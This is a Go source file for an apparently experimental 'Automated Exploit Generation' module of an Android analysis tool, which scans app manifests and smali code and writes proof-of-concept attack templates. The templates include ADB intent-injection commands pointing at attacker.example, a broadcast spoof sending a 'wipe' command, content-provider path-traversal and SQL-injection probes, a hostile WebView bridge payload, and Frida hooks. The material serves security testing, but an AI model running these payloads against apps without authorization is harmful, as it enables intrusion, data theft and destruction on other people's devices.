package experimental

import (
	"bufio"
	"context"
	"fmt"
	"io/fs"
	"os"
	"path/filepath"
	"regexp"
	"sort"
	"strings"
)

// ═══════════════════════════════════════════════════════════════════════════════
// AUTOMATED EXPLOIT GENERATION (AEG) MODULE
// ═══════════════════════════════════════════════════════════════════════════════
//
// AEG sits at the intersection of taint analysis, sink discovery and
// exploit-template generation. Mega Analyzer's AEG module is intentionally
// scoped to *generate exploit *suggestions* — concrete payloads, ADB
// commands, intent fuzzers and shell snippets — when the static analysis
// finds a plausible vulnerability primitive.
//
// The output is research-only. Every generated artifact is dropped into
// the per-run output directory under `aeg/` and is annotated with a
// disclaimer header.
//
// Detected primitives (initial coverage):
//
//   * Exported component without permission guard      -> intent injection PoC
//   * WebView with JavaScriptInterface AND setJSEnabled -> WebView XSS PoC
//   * Custom URL scheme handler that opens raw URLs    -> deeplink hijack PoC
//   * Exported BroadcastReceiver consuming extras       -> broadcast spoof PoC
//   * Hard-coded `loadLibrary` path / dynamic dex path  -> classpath hijack PoC

// AEGModule implements Module.
type AEGModule struct{}

// NewAEGModule constructs the module.
func NewAEGModule() *AEGModule { return &AEGModule{} }

func (m *AEGModule) ID() string   { return "aeg" }
func (m *AEGModule) Name() string { return "Automated Exploit Generation" }
func (m *AEGModule) Description() string {
	return "Generate exploit PoCs for primitives detected via static analysis"
}
func (m *AEGModule) Aliases() []string { return []string{"exploit", "poc", "4"} }
func (m *AEGModule) Tier() string      { return "experimental" }

// AEGRunDirName is the subdirectory under output where PoCs are written.
const AEGRunDirName = "aeg"

const aegHeader = `# ═══════════════════════════════════════════════════════════════════════════════
# Mega Analyzer — Automated Exploit Generation (AEG)
# Tier: experimental.  Output: research / authorized-test only.
# Do NOT run against assets you do not own or do not have written permission
# to test. The PoC below is generated mechanically from static analysis and
# may require manual adjustment before it triggers a vulnerability.
# ═══════════════════════════════════════════════════════════════════════════════
`

type aegPrimitive struct {
	Component   string
	Class       string
	File        string
	Description string
	Details     map[string]string
	Severity    Severity
}

// Run implements Module.Run.
func (m *AEGModule) Run(ctx context.Context, in Input) (*ModuleResult, error) {
	res := &ModuleResult{
		ModuleID:   m.ID(),
		ModuleName: m.Name(),
		Tier:       m.Tier(),
	}
	if in.TargetDir == "" {
		res.Skipped = true
		res.SkipReason = "no target directory"
		return res, nil
	}

	primitives, notes := discoverPrimitives(ctx, in.TargetDir)
	res.Notes = append(res.Notes, notes...)
	res.Bump("primitives", len(primitives))
	if len(primitives) == 0 {
		res.Notes = append(res.Notes, "AEG found no exploitable primitives in static metadata.")
		return res, nil
	}

	outDir := filepath.Join(in.OutputDir, AEGRunDirName)
	if err := os.MkdirAll(outDir, 0o755); err != nil {
		res.Notes = append(res.Notes, fmt.Sprintf("could not create AEG output dir: %v", err))
	}

	pkgName := in.Metadata["package"]
	if pkgName == "" {
		pkgName = guessPackageName(in.TargetDir)
	}

	for i, p := range primitives {
		if err := ctx.Err(); err != nil {
			return res, err
		}
		artifact := generatePoC(p, pkgName, i+1)
		if artifact == "" {
			continue
		}
		filename := fmt.Sprintf("aeg_%02d_%s.md", i+1, sanitizeFile(p.Component))
		path := filepath.Join(outDir, filename)
		if err := os.WriteFile(path, []byte(aegHeader+artifact), 0o644); err != nil {
			res.Notes = append(res.Notes, fmt.Sprintf("write %s: %v", filename, err))
			continue
		}

		// Proactively generate standalone executable JS scripts for Frida Hooks!
		if p.Component == "webview-jsinterface" {
			jsFilename := fmt.Sprintf("aeg_%02d_%s_frida.js", i+1, sanitizeFile(p.Component))
			jsPath := filepath.Join(outDir, jsFilename)
			jsScript := getWebViewFridaScript(p, pkgName)
			_ = os.WriteFile(jsPath, []byte(jsScript), 0o644)
		} else if p.Component == "exported-activity" {
			jsFilename := fmt.Sprintf("aeg_%02d_%s_frida.js", i+1, sanitizeFile(p.Component))
			jsPath := filepath.Join(outDir, jsFilename)
			jsScript := getActivityFridaScript(p, pkgName)
			_ = os.WriteFile(jsPath, []byte(jsScript), 0o644)
		}

		rel, _ := filepath.Rel(in.OutputDir, path)
		if rel == "" {
			rel = path
		}
		res.AddFinding(Finding{
			ID:          fmt.Sprintf("aeg-%s", strings.ToLower(strings.ReplaceAll(p.Component, " ", "-"))),
			Title:       fmt.Sprintf("AEG: PoC generated for %s", p.Component),
			Severity:    p.Severity,
			Confidence:  0.6,
			File:        p.File,
			Symbol:      p.Class,
			Description: p.Description,
			Tags:        []string{"aeg", "exploit", "poc"},
			Extra: map[string]string{
				"poc_artifact": rel,
				"package":      pkgName,
			},
		})
		res.Bump("pocs", 1)
	}
	return res, nil
}

// ═══════════════════════════════════════════════════════════════════════════════
// PRIMITIVE DISCOVERY
// ═══════════════════════════════════════════════════════════════════════════════

func discoverPrimitives(ctx context.Context, root string) ([]aegPrimitive, []string) {
	var (
		out   []aegPrimitive
		notes []string
	)
	manifestPath := findManifest(root)
	if manifestPath != "" {
		manifestPrims, mNotes := primitivesFromManifest(manifestPath)
		out = append(out, manifestPrims...)
		notes = append(notes, mNotes...)
	} else {
		notes = append(notes, "AndroidManifest.xml not found; only smali-based primitives will be considered.")
	}

	smaliPrims, sNotes := primitivesFromSmali(ctx, root)
	out = append(out, smaliPrims...)
	notes = append(notes, sNotes...)

	// Deduplicate by component + class.
	seen := make(map[string]struct{})
	dedup := make([]aegPrimitive, 0, len(out))
	for _, p := range out {
		key := p.Component + "|" + p.Class
		if _, ok := seen[key]; ok {
			continue
		}
		seen[key] = struct{}{}
		dedup = append(dedup, p)
	}
	sort.SliceStable(dedup, func(i, j int) bool {
		return dedup[i].Component < dedup[j].Component
	})
	return dedup, notes
}

func findManifest(root string) string {
	candidates := []string{
		filepath.Join(root, "AndroidManifest.xml"),
		filepath.Join(root, "original", "AndroidManifest.xml"),
		filepath.Join(root, "AndroidManifest.txt"),
	}
	for _, p := range candidates {
		if st, err := os.Stat(p); err == nil && !st.IsDir() {
			return p
		}
	}
	return ""
}

var (
	aegActivityRe   = regexp.MustCompile(`<activity[^>]*>`)
	aegServiceRe    = regexp.MustCompile(`<service[^>]*>`)
	aegReceiverRe   = regexp.MustCompile(`<receiver[^>]*>`)
	aegProviderRe   = regexp.MustCompile(`<provider[^>]*>`)
	aegExportedTrue = regexp.MustCompile(`android:exported="true"`)
	aegPermAttr     = regexp.MustCompile(`android:permission="([^"]+)"`)
	aegHostAttr     = regexp.MustCompile(`android:host="([^"]+)"`)
	aegSchemeAttr   = regexp.MustCompile(`android:scheme="([^"]+)"`)
	aegPackageAttr  = regexp.MustCompile(`package="([^"]+)"`)
	aegNameAttrRe   = regexp.MustCompile(`android:name="([^"]+)"`)
)

func primitivesFromManifest(path string) ([]aegPrimitive, []string) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, []string{fmt.Sprintf("read manifest: %v", err)}
	}
	text := string(data)
	pkg := ""
	if m := aegPackageAttr.FindStringSubmatch(text); len(m) > 1 {
		pkg = m[1]
	}

	var out []aegPrimitive
	check := func(re *regexp.Regexp, kind string) {
		matches := re.FindAllString(text, -1)
		for _, tag := range matches {
			if !aegExportedTrue.MatchString(tag) && !strings.Contains(tag, "<intent-filter") {
				continue
			}
			name := ""
			if m := aegNameAttrRe.FindStringSubmatch(tag); len(m) > 1 {
				name = m[1]
			}
			if name == "" {
				continue
			}
			if strings.HasPrefix(name, ".") && pkg != "" {
				name = pkg + name
			}
			perm := ""
			if m := aegPermAttr.FindStringSubmatch(tag); len(m) > 1 {
				perm = m[1]
			}
			details := map[string]string{
				"package":    pkg,
				"permission": perm,
			}
			if m := aegHostAttr.FindStringSubmatch(text); len(m) > 1 {
				details["host"] = m[1]
			}
			if m := aegSchemeAttr.FindStringSubmatch(text); len(m) > 1 {
				details["scheme"] = m[1]
			}
			sev := SevHigh
			if perm != "" {
				sev = SevMedium
			}
			out = append(out, aegPrimitive{
				Component:   "exported-" + kind,
				Class:       name,
				File:        path,
				Description: fmt.Sprintf("Exported %s %s without strong permission gate (%q).", kind, name, perm),
				Details:     details,
				Severity:    sev,
			})
		}
	}
	check(aegActivityRe, "activity")
	check(aegServiceRe, "service")
	check(aegReceiverRe, "receiver")
	check(aegProviderRe, "provider")

	return out, nil
}

var (
	aegLoadLibraryRe  = regexp.MustCompile(`->loadLibrary\(([^)]*)\)`)
	aegJSInterfaceRe  = regexp.MustCompile(`addJavascriptInterface\(`)
	aegSetJSEnabledRe = regexp.MustCompile(`setJavaScriptEnabled\(`)
	aegLoadUrlRe      = regexp.MustCompile(`->loadUrl\(`)
)

func primitivesFromSmali(ctx context.Context, root string) ([]aegPrimitive, []string) {
	var (
		out   []aegPrimitive
		notes []string
	)
	count := 0
	err := filepath.WalkDir(root, func(path string, d fs.DirEntry, err error) error {
		if err != nil {
			return nil
		}
		if ctx.Err() != nil {
			return ctx.Err()
		}
		if d.IsDir() || !strings.HasSuffix(strings.ToLower(d.Name()), ".smali") {
			return nil
		}
		count++
		if count > 20000 {
			return filepath.SkipAll
		}
		f, ferr := os.Open(path)
		if ferr != nil {
			return nil
		}
		defer f.Close()

		scanner := bufio.NewScanner(f)
		scanner.Buffer(make([]byte, 0, 64*1024), 1024*1024)
		var (
			cls     string
			hasJS   bool
			hasInt  bool
			hasURL  bool
			loadLib string
		)
		for scanner.Scan() {
			line := scanner.Text()
			if strings.HasPrefix(strings.TrimSpace(line), ".class") {
				cls = extractClassName(line)
				continue
			}
			if aegSetJSEnabledRe.MatchString(line) {
				hasJS = true
			}
			if aegJSInterfaceRe.MatchString(line) {
				hasInt = true
			}
			if aegLoadUrlRe.MatchString(line) {
				hasURL = true
			}
			if m := aegLoadLibraryRe.FindStringSubmatch(line); len(m) > 1 {
				loadLib = strings.TrimSpace(m[1])
			}
		}
		if hasJS && hasInt {
			out = append(out, aegPrimitive{
				Component:   "webview-jsinterface",
				Class:       cls,
				File:        path,
				Description: "WebView with addJavascriptInterface and JS enabled — XSS-to-Java pivot is plausible.",
				Severity:    SevHigh,
				Details:     map[string]string{"loadUrl": fmt.Sprintf("%v", hasURL)},
			})
		}
		if loadLib != "" {
			out = append(out, aegPrimitive{
				Component:   "native-loadlibrary",
				Class:       cls,
				File:        path,
				Description: "loadLibrary call detected — investigate whether the library path is influenced by attacker-controlled input.",
				Severity:    SevMedium,
				Details:     map[string]string{"argument": loadLib},
			})
		}
		return nil
	})
	if err != nil && err != filepath.SkipAll {
		notes = append(notes, err.Error())
	}
	return out, notes
}

// ═══════════════════════════════════════════════════════════════════════════════
// PoC GENERATION
// ═══════════════════════════════════════════════════════════════════════════════

func generatePoC(p aegPrimitive, pkg string, idx int) string {
	switch p.Component {
	case "exported-activity":
		return pocExportedActivity(p, pkg)
	case "exported-receiver":
		return pocExportedReceiver(p, pkg)
	case "exported-service":
		return pocExportedService(p, pkg)
	case "exported-provider":
		return pocExportedProvider(p, pkg)
	case "webview-jsinterface":
		return pocWebViewJSInterface(p)
	case "native-loadlibrary":
		return pocLoadLibraryHijack(p)
	default:
		return ""
	}
}

func pocExportedActivity(p aegPrimitive, pkg string) string {
	scheme := p.Details["scheme"]
	host := p.Details["host"]
	deeplink := ""
	if scheme != "" {
		deeplink = scheme + "://" + host
	}
	return fmt.Sprintf(`## Exported Activity Intent Injection PoC

Target class: %s
Package: %s
Permission gate: %q

### ADB intent (no extras)

`+"```bash"+`
adb shell am start -n %s/%s --activity-clear-task
`+"```"+`

### ADB intent with crafted extras

`+"```bash"+`
adb shell am start -n %s/%s \
  --es "url" "https://attacker.example/x" \
  --ez "authenticated" true \
  --ei "userId" 1
`+"```"+`

### Deep-link hand-off (if scheme is exported)

%s

### Notes

* If a sibling app can match the intent filter, the activity is reachable
  without ADB. Verify android:exported and any signature-level permissions.
* Combine with a crafted Intent.FLAG_GRANT_READ_URI_PERMISSION when the
  target re-broadcasts received URIs.
`,
		p.Class, pkg, p.Details["permission"],
		pkg, p.Class,
		pkg, p.Class,
		ifEmpty(deeplink, "_no scheme/host detected_"),
	)
}

func pocExportedReceiver(p aegPrimitive, pkg string) string {
	return fmt.Sprintf(`## Exported BroadcastReceiver Spoof PoC

Receiver: %s
Package: %s
Permission gate: %q

### Reproduce (broadcast)

`+"```bash"+`
adb shell am broadcast -n %s/%s \
  --es "command" "wipe" \
  --ez "force" true
`+"```"+`

### Inter-app PoC (Java/Kotlin)

`+"```kotlin"+`
val i = Intent().apply {
    setClassName("%s", "%s")
    putExtra("command", "wipe")
}
context.sendBroadcast(i)
`+"```"+`

Replace the extras with the real keys consumed by the receiver. Search the
receiver's onReceive() for .getStringExtra / .getIntExtra usages.
`,
		p.Class, pkg, p.Details["permission"],
		pkg, p.Class, pkg, p.Class,
	)
}

func pocExportedService(p aegPrimitive, pkg string) string {
	return fmt.Sprintf(`## Exported Service Hijack PoC

Service: %s
Package: %s
Permission gate: %q

### Start the service

`+"```bash"+`
adb shell am startservice -n %s/%s --es "task" "ping"
`+"```"+`

### Bind from another app

`+"```kotlin"+`
val i = Intent().apply { setClassName("%s", "%s") }
context.bindService(i, conn, Context.BIND_AUTO_CREATE)
`+"```"+`

If the service exposes a Messenger or AIDL interface, dump the .aidl from
the APK and craft a parcel with arbitrary extras to test for missing
permission checks.
`,
		p.Class, pkg, p.Details["permission"],
		pkg, p.Class, pkg, p.Class,
	)
}

func pocExportedProvider(p aegPrimitive, pkg string) string {
	return fmt.Sprintf(`## Exported ContentProvider Probe PoC

Provider: %s
Package: %s

### Read attempt (returns matrix cursor when unprotected)

`+"```bash"+`
adb shell content query --uri content://%s/
adb shell content query --uri content://%s/../sandbox/config.xml
`+"```"+`

### SQL-injection style probe

`+"```bash"+`
adb shell content query --uri content://%s/ \
  --where "1=1) UNION SELECT name FROM sqlite_master --"
`+"```"+`

If the provider returns rows for the path-traversal probe, it's almost
certainly a CVE-2018-9492 style file leak.
`, p.Class, pkg, p.Class, p.Class, p.Class)
}

func pocWebViewJSInterface(p aegPrimitive) string {
	return fmt.Sprintf(`## WebView JavascriptInterface RCE-pivot PoC

Class: %s

### HTML payload (host on attacker server)

`+"```html"+`
<!doctype html>
<html><body>
<script>
  // Replace 'bridge' with the actual interface name registered by the app.
  if (typeof bridge !== 'undefined') {
    try { bridge.invokeNativeMethod("id", "whoami"); } catch (e) {}
    document.title = JSON.stringify(Object.keys(bridge));
  }
</script>
</body></html>
`+"```"+`

### Trigger via deep-link / loadUrl()

`+"```bash"+`
adb shell am start -W -a android.intent.action.VIEW \
  -d "https://attacker.example/poc.html" \
  -n <package>/.<vulnerable_activity>
`+"```"+`

### Exploitation strategy

* Enumerate exposed methods via Object.keys(bridge)
* Look for getClass() pivot (CVE-2012-6636 style) when targetSdk < 17
* Search the smali for @JavascriptInterface methods that reach Runtime.exec
`,
		p.Class,
	)
}

func pocLoadLibraryHijack(p aegPrimitive) string {
	return fmt.Sprintf(`## loadLibrary path-influence PoC

Class: %s
Argument: %s

### Hypothesis

If the loadLibrary argument is influenced by attacker-controlled input
(extras, content provider, file path, environment), an attacker may swap
the loaded native library for a malicious one.

### Verification steps

1. Run the app under strace / frida and observe the dlopen() call.
2. If the path resolves through /data/local/tmp or /sdcard, drop a
   crafted libname.so there and re-launch.
3. Confirm exploitability via JNI_OnLoad logging.

### Frida snippet

`+"```javascript"+`
Java.perform(function() {
  var sys = Java.use("java.lang.System");
  sys.loadLibrary.implementation = function(name) {
    console.log("[+] loadLibrary called with:", name);
    return this.loadLibrary(name);
  };
});
`+"```"+`
`,
		p.Class, p.Details["argument"],
	)
}

// ═══════════════════════════════════════════════════════════════════════════════
// HELPERS
// ═══════════════════════════════════════════════════════════════════════════════

func ifEmpty(s, alt string) string {
	if strings.TrimSpace(s) == "" {
		return alt
	}
	return s
}

func sanitizeFile(s string) string {
	s = strings.ToLower(s)
	out := make([]byte, 0, len(s))
	for i := 0; i < len(s); i++ {
		c := s[i]
		switch {
		case c >= 'a' && c <= 'z', c >= '0' && c <= '9':
			out = append(out, c)
		case c == '-' || c == '_':
			out = append(out, c)
		default:
			out = append(out, '_')
		}
	}
	if len(out) == 0 {
		return "primitive"
	}
	return string(out)
}

func guessPackageName(root string) string {
	manifest := findManifest(root)
	if manifest == "" {
		return "com.example.target"
	}
	data, err := os.ReadFile(manifest)
	if err != nil {
		return "com.example.target"
	}
	if m := aegPackageAttr.FindStringSubmatch(string(data)); len(m) > 1 {
		return m[1]
	}
	return "com.example.target"
}

func getWebViewFridaScript(p aegPrimitive, pkg string) string {
	return fmt.Sprintf(`// WebView JavascriptInterface and JS settings hook generated by Mega-Analyzer AEG
// Package: %s
// Target: %s

Java.perform(function() {
    console.log("[*] Injected WebView settings and JS Interface tracer.");

    var WebView = Java.use("android.webkit.WebView");
    var WebSettings = Java.use("android.webkit.WebSettings");

    // Hook JavascriptInterface registrations
    WebView.addJavascriptInterface.implementation = function(obj, name) {
        console.log("[+] WebView.addJavascriptInterface(obj=" + obj.toString() + ", name='" + name + "')");
        // Reflect methods
        try {
            var methods = obj.getClass().getDeclaredMethods();
            methods.forEach(function(m) {
                console.log("   -> Exposed Method: " + m.toString());
            });
        } catch(e) {
            console.log("   [!] Could not reflect methods: " + e.message);
        }
        return this.addJavascriptInterface(obj, name);
    };

    // Hook settings changes to trace where JS gets enabled
    WebSettings.setJavaScriptEnabled.implementation = function(enabled) {
        console.log("[+] WebSettings.setJavaScriptEnabled(" + enabled + ") called");
        return this.setJavaScriptEnabled(enabled);
    };
});
`, pkg, p.Class)
}

func getActivityFridaScript(p aegPrimitive, pkg string) string {
	return fmt.Sprintf(`// Exported Activity parameter tracer hook generated by Mega-Analyzer AEG
// Package: %s
// Target Class: %s

Java.perform(function() {
    console.log("[*] Injected parameter tracer for %s");

    var Activity = Java.use("%s");
    
    // Trace Activity lifecycle callbacks for intent inspection
    if (Activity.onCreate) {
        Activity.onCreate.implementation = function(savedInstanceState) {
            console.log("[*] Activity.onCreate() called for %s");
            var intent = this.getIntent();
            if (intent !== null) {
                console.log("    Intent Actions: " + intent.getAction());
                console.log("    Intent Data: " + intent.getDataString());
                var extras = intent.getExtras();
                if (extras !== null) {
                    console.log("    Intent Extras:");
                    var keys = extras.keySet().iterator();
                    while (keys.hasNext()) {
                        var key = keys.next().toString();
                        var val = extras.get(key);
                        console.log("       - " + key + " = " + (val !== null ? val.toString() : "null"));
                    }
                }
            }
            return this.onCreate(savedInstanceState);
        };
    }
});
`, pkg, p.Class, p.Class, strings.ReplaceAll(strings.TrimSuffix(strings.TrimPrefix(p.Class, "L"), ";"), "/", "."), p.Class)
}
